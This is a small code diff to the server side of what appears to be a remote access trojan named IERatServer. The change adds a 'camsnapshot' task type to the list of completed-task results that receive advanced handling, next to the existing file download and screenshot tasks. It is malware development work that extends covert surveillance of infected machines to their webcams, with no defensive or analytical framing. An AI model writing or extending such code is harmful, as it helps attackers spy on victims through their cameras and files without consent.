@@ -34,7 +34,7 @@ namespace IERatServer
                 // print command results and save to history
                 foreach (TaskObject taskObject in requestObject.CompletedTasks)
                 {
-                    if ((taskObject.Type == "download") || (taskObject.Type == "screenshot"))
+                    if ((taskObject.Type == "download") || (taskObject.Type == "screenshot") || (taskObject.Type == "camsnapshot"))
                     {
                         Actions.HandleAdvancedTasks(requestObject, taskObject);
                     }
